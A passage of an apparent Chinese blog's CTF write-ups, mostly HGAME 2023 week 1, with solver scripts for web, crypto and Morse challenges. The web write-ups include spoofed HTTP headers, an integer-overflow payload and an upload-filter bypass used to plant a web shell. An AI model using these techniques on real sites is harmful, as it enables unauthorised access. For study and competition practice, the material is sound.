&#125;<br></code></pre></td></tr></table></figure><p>这里可以改变cost，从而改变<code>GONGDE</code>,因此可以构造payload:<code>name=Cost&amp;quantity=214748365</code></p><img src="/2023/02/19/VNCTF2023/2.png" class="">]]></content>
    
    
    <categories>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HGAME</title>
    <link href="/2023/01/05/HGAME/"/>
    <url>/2023/01/05/HGAME/</url>
    
    <content type="html"><![CDATA[<h2 id="week-1"><a class="markdownIt-Anchor" href="#week-1"></a> Week 1</h2><h3 id="sign-in"><a class="markdownIt-Anchor" href="#sign-in"></a> Sign In</h3><p>签到题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br>flag=<span class="hljs-string">&quot;aGdhbWV7V2VsY29tZV9Ub19IR0FNRTIwMjMhfQ==&quot;</span><br><span class="hljs-built_in">print</span>(base64.b64decode(flag))<br><span class="hljs-comment">#b&#x27;hgame&#123;Welcome_To_HGAME2023!&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="classic-childhood-game"><a class="markdownIt-Anchor" href="#classic-childhood-game"></a> Classic Childhood Game</h3><p>打开题目是个游戏，先随便玩玩</p><p>这种题就是前端JS，玩腻了直接看源码</p><p>在文件<code>./Res/Events.js</code>拉到最下面有一个变量a是unicode编码</p><p><code>\x59\x55\x64\x6b\x61\x47\x4a\x58\x56\x6a\x64\x61\x62\x46\x5a\x31\x59\x6d\x35\x73\x53\x31\x6c\x59\x57\x6d\x68\x6a\x4d\x6b\x35\x35\x59\x56\x68\x43\x4d\x45\x70\x72\x57\x6a\x46\x69\x62\x54\x55\x31\x56\x46\x52\x43\x4d\x46\x6c\x56\x59\x7a\x42\x69\x56\x31\x59\x35</code></p><p>直接到Python解码</p><img src="/2023/01/05/HGAME/3.png" class=""><h3 id="become-a-member"><a class="markdownIt-Anchor" href="#become-a-member"></a> Become A Member</h3><p>考察HTTP请求头</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-number">1</span>.请先提供一下身份证明（<span class="hljs-title class_">Cute</span>-<span class="hljs-title class_">Bunny</span>）哦    <span class="hljs-title class_">User</span>-<span class="hljs-title class_">Agent</span><span class="hljs-symbol">:Cute-Bunny</span><br><span class="hljs-number">2</span>.每一个能够成为会员的顾客们都应该持有名为<span class="hljs-title class_">Vidar</span>的邀请码（code）    <span class="hljs-title class_">Cookie</span><span class="hljs-symbol">:code=Vidar</span><br><span class="hljs-number">3</span>.由于特殊原因，我们只接收来自于bunnybunnybunny.com的会员资格申请<span class="hljs-symbol">referer:</span>bunnybunnybunny.com<br><span class="hljs-number">4</span>.就差最后一个本地的请求，就能拿到会员账号啦X-forwarded-<span class="hljs-symbol">for:</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br><span class="hljs-number">5</span>.<span class="hljs-symbol">username:</span>luckytoday <span class="hljs-symbol">password:</span>happy123(请以json请求方式登陆)&#123;<span class="hljs-string">&quot;username&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;luckytoday&quot;</span></span>,<span class="hljs-string">&quot;password&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;happy123&quot;</span></span>&#125;<br></code></pre></td></tr></table></figure><img src="/2023/01/05/HGAME/6.png" class=""><h3 id="guess-who-i-am"><a class="markdownIt-Anchor" href="#guess-who-i-am"></a> Guess Who I Am</h3><p>这个题是要写脚本回答100个问题</p><p>查看页面源码给了hint: <a href="https://github.com/Potat0000/Vidar-Website/blob/master/src/scripts/config/member.js">https://github.com/Potat0000/Vidar-Website/blob/master/src/scripts/config/member.js</a></p><p>访问得到答案库</p><p>把答案考到本地</p><p>接着写Python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://week-1.hgame.lwsec.cn:32380&quot;</span><br>url1 = <span class="hljs-string">&quot;http://week-1.hgame.lwsec.cn:32380/api/getQuestion&quot;</span><br>url2 = <span class="hljs-string">&quot;http://week-1.hgame.lwsec.cn:32380/api/getScore&quot;</span><br>Cookie=<span class="hljs-string">&quot;session=MTY3MjkzNzc4MHxEdi1CQkFFQ180SUFBUkFCRUFBQVBQLUNBQUlHYzNSeWFXNW5EQWdBQm5OdmJIWmxaQU5wYm5RRUFnQUVCbk4wY21sdVp3d05BQXRqYUdGc2JHVnVaMlZKWkFOcGJuUUVBd0Rfb2c9PXyjkMJVTSpoY_gUdzTPAsOafTVVHnJtDE4aemtvw51VCw==&quot;</span><br><span class="hljs-comment"># resp = requests.get(url)</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">110</span>):<br>    resp1 = requests.get(url1,headers=&#123;<span class="hljs-string">&quot;Cookie&quot;</span>:Cookie&#125;)<br>    resp2 = requests.get(url2,headers=&#123;<span class="hljs-string">&quot;Cookie&quot;</span>:Cookie&#125;)<br>    text1 = resp1.text<br>    text1 = text1[text1.index(<span class="hljs-string">&quot;:&quot;</span>) + <span class="hljs-number">1</span>:-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;00&#x27;</span> <span class="hljs-keyword">in</span> text1:<br>        text1=text1[text1.index(<span class="hljs-string">&#x27;\\&#x27;</span>)+<span class="hljs-number">5</span>:] <span class="hljs-comment">#爬下来特殊字符都是unicode编码，去掉这些编码符，后面匹配就行</span><br>    text2 = resp2.text<br>    text2 = text2[text2.index(<span class="hljs-string">&quot;:&quot;</span>) + <span class="hljs-number">1</span>:-<span class="hljs-number">1</span>]<br>    <span class="hljs-comment"># print(text1)</span><br>    <span class="hljs-comment"># print(text2)</span><br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;2.js&#x27;</span>, mode=<span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        line0 = f.readline()<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            line1 = f.readline()<br>            <span class="hljs-keyword">if</span> line1:<br>                <span class="hljs-keyword">if</span> text1 <span class="hljs-keyword">in</span> line1:<br>                    answer = line0[line0.index(<span class="hljs-string">&quot;:&quot;</span>) + <span class="hljs-number">3</span>:-<span class="hljs-number">3</span>]<br>                    <span class="hljs-comment"># print(answer)</span><br>                    <span class="hljs-keyword">break</span><br>                <span class="hljs-keyword">else</span>:<br>                    line0 = line1<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">break</span><br>    data=&#123;<br>        <span class="hljs-string">&quot;id&quot;</span>:answer<br>    &#125;<br>    <span class="hljs-comment"># print(data)</span><br>    r = requests.post(url=url+<span class="hljs-string">&#x27;/api/verifyAnswer&#x27;</span>,data=data,headers=&#123;<span class="hljs-string">&quot;Cookie&quot;</span>: Cookie&#125;)<br>    <span class="hljs-keyword">try</span>:<br>        Cookie=r.headers[<span class="hljs-string">&#x27;set-cookie&#x27;</span>]  <span class="hljs-comment">#有时访问后没有返回cookie会报错</span><br>    <span class="hljs-keyword">except</span> KeyError:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-comment"># print(Cookie)</span><br>    <span class="hljs-built_in">print</span>(r.text)<br>    resp2 = requests.get(url2, headers=&#123;<span class="hljs-string">&quot;Cookie&quot;</span>: Cookie&#125;)<br>    text2 = resp2.text<br>    text2 = text2[text2.index(<span class="hljs-string">&quot;:&quot;</span>) + <span class="hljs-number">1</span>:-<span class="hljs-number">1</span>]<br>    <span class="hljs-built_in">print</span>(text2)<br></code></pre></td></tr></table></figure><p>回答100次后得到flag:<code>hgame&#123;Guess_who_i_am^Happy_Crawler&#125;</code></p><h3 id="show-me-your-beauty"><a class="markdownIt-Anchor" href="#show-me-your-beauty"></a> Show Me Your Beauty</h3><p>这是一道文件上传</p><p>查看页面源码，发现做了前端过滤，不过前端过滤相当于没有过滤</p><p>传个码上去，先用后缀.jpg，再抓包改，发现后端也过滤了，这里可以大写绕过</p><img src="/2023/01/05/HGAME/4.png" class=""><p>蚁剑连接拿flag</p><h3 id="rsa"><a class="markdownIt-Anchor" href="#rsa"></a> RSA</h3><p>拿到附件，源码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()<br><br>p = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br>n=p*q<br>e = <span class="hljs-number">65537</span><br>m = bytes_to_long(flag)<br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;c=<span class="hljs-subst">&#123;c&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;n=<span class="hljs-subst">&#123;n&#125;</span>&quot;</span>)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">c=110674792674017748243232351185896019660434718342001686906527789876264976328686134101972125493938434992787002915562500475480693297360867681000092725583284616353543422388489208114545007138606543678040798651836027433383282177081034151589935024292017207209056829250152219183518400364871109559825679273502274955582</span><br><span class="hljs-string">n=135127138348299757374196447062640858416920350098320099993115949719051354213545596643216739555453946196078110834726375475981791223069451364024181952818056802089567064926510294124594174478123216516600368334763849206942942824711531334239106807454086389211139153023662266125937481669520771879355089997671125020789</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>常规RSA题</p><p><a href="http://www.factordb.com/">在线网站</a>大整数分解n得到p,q</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br>c=<span class="hljs-number">110674792674017748243232351185896019660434718342001686906527789876264976328686134101972125493938434992787002915562500475480693297360867681000092725583284616353543422388489208114545007138606543678040798651836027433383282177081034151589935024292017207209056829250152219183518400364871109559825679273502274955582</span><br>n=<span class="hljs-number">135127138348299757374196447062640858416920350098320099993115949719051354213545596643216739555453946196078110834726375475981791223069451364024181952818056802089567064926510294124594174478123216516600368334763849206942942824711531334239106807454086389211139153023662266125937481669520771879355089997671125020789</span><br>p=<span class="hljs-number">12022912661420941592569751731802639375088427463430162252113082619617837010913002515450223656942836378041122163833359097910935638423464006252814266959128953</span><br>q=<span class="hljs-number">11239134987804993586763559028187245057652550219515201768644770733869088185320740938450178816138394844329723311433549899499795775655921261664087997097294813</span><br>e = <span class="hljs-number">65537</span><br><br>d = libnum.invmod(e, (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br><span class="hljs-built_in">print</span>(libnum.n2s(m))<br></code></pre></td></tr></table></figure><h3 id="be-stream"><a class="markdownIt-Anchor" href="#be-stream"></a> Be Stream</h3><p>题目源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">type</span>(flag) == <span class="hljs-built_in">bytes</span><br><br>key = [<span class="hljs-built_in">int</span>.from_bytes(<span class="hljs-string">b&quot;Be water&quot;</span>, <span class="hljs-string">&#x27;big&#x27;</span>), <span class="hljs-built_in">int</span>.from_bytes(<span class="hljs-string">b&quot;my friend&quot;</span>, <span class="hljs-string">&#x27;big&#x27;</span>)]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">stream</span>(<span class="hljs-params">i</span>):<br>    <span class="hljs-keyword">if</span> i==<span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> key[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">elif</span> i==<span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> key[<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> (stream(i-<span class="hljs-number">2</span>)*<span class="hljs-number">7</span> + stream(i-<span class="hljs-number">1</span>)*<span class="hljs-number">4</span>)<br><br>enc = <span class="hljs-string">b&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag)):<br>    water = stream((i//<span class="hljs-number">2</span>)**<span class="hljs-number">6</span>) % <span class="hljs-number">256</span><br>    enc += <span class="hljs-built_in">bytes</span>([water ^ flag[i]])<br><br><span class="hljs-built_in">print</span>(enc)<br><span class="hljs-comment"># b&#x27;\x1a\x15\x05\t\x17\t\xf5\xa2-\x06\xec\xed\x01-\xc7\xcc2\x1eXA\x1c\x157[\x06\x13/!-\x0b\xd4\x91-\x06\x8b\xd4-\x1e+*\x15-pm\x1f\x17\x1bY&#x27;</span><br></code></pre></td></tr></table></figure><p>循环加递归，重复太多，直接按这种写法是跑步出来的</p><p>修改成迭代，每次先mod256</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">key = [<span class="hljs-built_in">int</span>.from_bytes(<span class="hljs-string">b&quot;Be water&quot;</span>, <span class="hljs-string">&#x27;big&#x27;</span>), <span class="hljs-built_in">int</span>.from_bytes(<span class="hljs-string">b&quot;my friend&quot;</span>, <span class="hljs-string">&#x27;big&#x27;</span>)]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">stream</span>():<br>    stream = [<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>((<span class="hljs-number">48</span> // <span class="hljs-number">2</span>) ** <span class="hljs-number">6</span>)]<br>    stream[<span class="hljs-number">0</span>] = key[<span class="hljs-number">0</span>]<br>    stream[<span class="hljs-number">1</span>] = key[<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>, <span class="hljs-number">24</span> ** <span class="hljs-number">6</span>):<br>        stream[i] = (stream[i - <span class="hljs-number">2</span>] * <span class="hljs-number">7</span> + stream[i - <span class="hljs-number">1</span>] * <span class="hljs-number">4</span>) % <span class="hljs-number">256</span><br>    <span class="hljs-keyword">return</span> stream<br><br><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>enc = <span class="hljs-string">b&#x27;\x1a\x15\x05\t\x17\t\xf5\xa2-\x06\xec\xed\x01-\xc7\xcc2\x1eXA\x1c\x157[\x06\x13/!-\x0b\xd4\x91-\x06\x8b\xd4-\x1e+*\x15-pm\x1f\x17\x1bY&#x27;</span><br>s = stream()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">48</span>):<br>    water = s[(i // <span class="hljs-number">2</span>) ** <span class="hljs-number">6</span>] % <span class="hljs-number">256</span><br>    <span class="hljs-comment">#print(water)</span><br>    flag += <span class="hljs-built_in">chr</span>(water ^ enc[i])<br><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h3 id="神秘的电话"><a class="markdownIt-Anchor" href="#神秘的电话"></a> 神秘的电话</h3><p>附件是一个morse音频和一个加密密文</p><p>加密密文为</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-number">5</span>Ye<span class="hljs-name">g5</span>Liq<span class="hljs-number">5</span>pif<span class="hljs-number">5</span>pyf<span class="hljs-number">5</span>Ym<span class="hljs-symbol">N77</span>y<span class="hljs-name">M5</span>oiR<span class="hljs-number">5</span>Lus<span class="hljs-number">5</span>pS<span class="hljs-number">25</span>Yiw<span class="hljs-number">5</span>LiA<span class="hljs-number">5</span>Liq<span class="hljs-number">56</span>We<span class="hljs-number">56</span>eY<span class="hljs-number">55</span>qE<span class="hljs-number">5</span>raI<span class="hljs-number">5</span>oGv<span class="hljs-number">44</span>CC<span class="hljs-number">5</span>L<span class="hljs-number">2</span><span class="hljs-name">G5</span>piv<span class="hljs-number">6</span>L+Z<span class="hljs-number">5</span>Liq<span class="hljs-number">5</span>raI<span class="hljs-number">5</span>oGv<span class="hljs-number">6</span>KKr<span class="hljs-number">6</span>Ye<span class="hljs-symbol">N6</span>Ye<span class="hljs-symbol">N5</span>Yq<span class="hljs-name">g5</span>a+<span class="hljs-name">G77</span>y<span class="hljs-name">M5</span>oiR<span class="hljs-number">5</span>Lus<span class="hljs-number">5</span>Li<span class="hljs-symbol">N55</span>+l<span class="hljs-number">6</span>YGT<span class="hljs-number">5</span>a<span class="hljs-number">6</span>D<span class="hljs-number">55</span>qE<span class="hljs-number">55</span>yf<span class="hljs-number">5</span>q<span class="hljs-number">2</span>j<span class="hljs-number">5</span>ZCr<span class="hljs-number">5</span>LmJ<span class="hljs-number">5</span>piv<span class="hljs-number">5</span>LuA<span class="hljs-number">5</span>LmI<span class="hljs-number">44</span>CC<span class="hljs-number">5</span>ZSv<span class="hljs-number">5</span>LiA<span class="hljs-number">55</span>+l<span class="hljs-number">6</span>YGT<span class="hljs-number">55</span>qE<span class="hljs-number">5</span>L+h<span class="hljs-number">5</span>oGv<span class="hljs-number">5</span>piv<span class="hljs-number">5</span>YWz<span class="hljs-number">5</span>Lq<span class="hljs-meta">O5</span>a+<span class="hljs-name">G6</span>ZKl<span class="hljs-number">55</span>qE<span class="hljs-number">77</span>ya<span class="hljs-number">4</span>oCc<span class="hljs-number">5</span>Y+q<span class="hljs-number">5</span>pyJ<span class="hljs-number">5</span>YCS<span class="hljs-number">552</span>A<span class="hljs-number">57</span><span class="hljs-number">+76</span>L+H<span class="hljs-number">5</span>Y<span class="hljs-number">2</span>B<span class="hljs-number">5</span>YWr<span class="hljs-number">5</span>bGC<span class="hljs-number">55</span>qE<span class="hljs-number">56</span>+x<span class="hljs-number">56</span>y<span class="hljs-name">G5</span>om<span class="hljs-symbol">N6</span>I<span class="hljs-meta">O95</span>oq<span class="hljs-number">16</span>L<span class="hljs-number">6</span><span class="hljs-number">+5</span>YyX<span class="hljs-number">5</span>qy<span class="hljs-symbol">n56</span>We<span class="hljs-number">6</span>K+d<span class="hljs-number">55</span>qE<span class="hljs-number">57</span>uI<span class="hljs-number">54</span>K<span class="hljs-number">54</span>oCd<span class="hljs-number">44</span>CC<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br>a=<span class="hljs-string">&quot;5Yeg5Liq5pif5pyf5YmN77yM5oiR5Lus5pS25Yiw5LiA5Liq56We56eY55qE5raI5oGv44CC5L2G5piv6L+Z5Liq5raI5oGv6KKr6YeN6YeN5Yqg5a+G77yM5oiR5Lus5LiN55+l6YGT5a6D55qE55yf5q2j5ZCr5LmJ5piv5LuA5LmI44CC5ZSv5LiA55+l6YGT55qE5L+h5oGv5piv5YWz5LqO5a+G6ZKl55qE77ya4oCc5Y+q5pyJ5YCS552A57+76L+H5Y2B5YWr5bGC55qE56+x56yG5omN6IO95oq16L6+5YyX5qyn56We6K+d55qE57uI54K54oCd44CC&quot;</span><br>a=base64.b64decode(a)<br><span class="hljs-built_in">print</span>(a.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br><span class="hljs-comment">#几个星期前，我们收到一个神秘的消息。但是这个消息被重重加密，我们不知道它的真正含义是什么。唯一知道的信息是关于密钥的：“只有倒着翻过十八层的篱笆才能抵达北欧神话的终点”。</span><br></code></pre></td></tr></table></figure><p>音频用Au打开，手动翻译morse密文</p><p><code>-----/..---/..---/...--/./..--.-/.--./.-./../../-.../.-../-.--/..--.-/..--.-/..../---/-./.--/.-/..--.-/.---/--/--./..../..--.-/..-./--./-.-/-.-./--.-/.-/---/--.-/-/--/..-./.-.</code></p><p><a href="https://mosimima.hwcha.com/">在线解码</a> 并转小写<code>0223e_priibly__honwa_jmgh_fgkcqaoqtmfr</code></p><p>“倒着翻过十八层篱笆”应该是栅栏加密，但是搞不出来😭~~~</p><p>wp出来啦，继续补充一下</p><p>没想到“北欧神话”对应维吉尼亚密码…</p><p>“逆序”-&gt;“18层栅栏解密”-&gt;“密钥为vidar的维吉尼亚解密”</p><p><code>hgame&#123;welcome_to_hgame2023_and_enjoy_hacking&#125;</code></p><h3 id="兔兔的车票"><a class="markdownIt-Anchor" href="#兔兔的车票"></a> 兔兔的车票</h3><p>由于没有看到题目的注解<code>注：flag.png已经提前保存在source文件夹下，并且命名为picture&#123;x&#125;.png</code></p><p>导致没有思路，官方wp已经出了还是记录一下加深理解</p><p>题⽬的流程是先随机⽣成3张噪声图⽚作为nonce，然后把flag.png和picture{xx}.png打乱再与nonce</p><p>进⾏XOR。因为只有三张nonce，⽽picture有15张，所以⼤概率有picture跟flag.png重⽤了同⼀张</p><p>nonce。就可以⽤这两张加密图⽚进⾏XOR，得到</p><p><em>flag</em>.<em>png</em> ⊕ <em>picturex</em>.<em>png</em></p><img src="/2023/01/05/HGAME/15.png" class=""><p>原题代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> shuffle, randint, getrandbits<br><br>flagImg = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.png&#x27;</span>)<br>width = flagImg.width  <span class="hljs-comment">#379</span><br>height = flagImg.height <span class="hljs-comment">#234</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">makeSourceImg</span>():<br>    colors = long_to_bytes(getrandbits(width * height * <span class="hljs-number">24</span>))[::-<span class="hljs-number">1</span>]<br>    img = Image.new(<span class="hljs-string">&#x27;RGB&#x27;</span>, (width, height))<br>    x = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):<br>            img.putpixel((j, i), (colors[x], colors[x + <span class="hljs-number">1</span>], colors[x + <span class="hljs-number">2</span>]))<br>            x += <span class="hljs-number">3</span><br>    <span class="hljs-keyword">return</span> img<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">xorImg</span>(<span class="hljs-params">keyImg, sourceImg</span>):<br>    img = Image.new(<span class="hljs-string">&#x27;RGB&#x27;</span>, (width, height))<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):<br>            p1, p2 = keyImg.getpixel((j, i)), sourceImg.getpixel((j, i))<br>            img.putpixel((j, i), <span class="hljs-built_in">tuple</span>([(p1[k] ^ p2[k]) <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>)]))<br>    <span class="hljs-keyword">return</span> img<br><br>n1 = makeSourceImg()<br>n2 = makeSourceImg()<br>n3 = makeSourceImg()<br>nonce = [n1, n2, n3]<br><br>index = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>))<br>shuffle(index)<br>e=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> index:<br>    im = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;source/picture<span class="hljs-subst">&#123;i&#125;</span>.png&quot;</span>)<br>    key = nonce[randint(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>)]<br>    encImg = xorImg(key, im)<br>    encImg.save(<span class="hljs-string">f&#x27;pics/enc<span class="hljs-subst">&#123;e&#125;</span>.png&#x27;</span>)<br>    e+=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>只有16张图片，直接爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>width=<span class="hljs-number">379</span>   <span class="hljs-comment">#宽度和高度查看图片属性可知</span><br>height=<span class="hljs-number">234</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">xorImg</span>(<span class="hljs-params">keyImg, sourceImg</span>):<br>    img = Image.new(<span class="hljs-string">&#x27;RGB&#x27;</span>, (width, height))<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):<br>            p1, p2 = keyImg.getpixel((j, i)), sourceImg.getpixel((j, i))<br>            img.putpixel((j, i), <span class="hljs-built_in">tuple</span>([(p1[k] ^ p2[k]) <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>)]))<br>    <span class="hljs-keyword">return</span> img<br><span 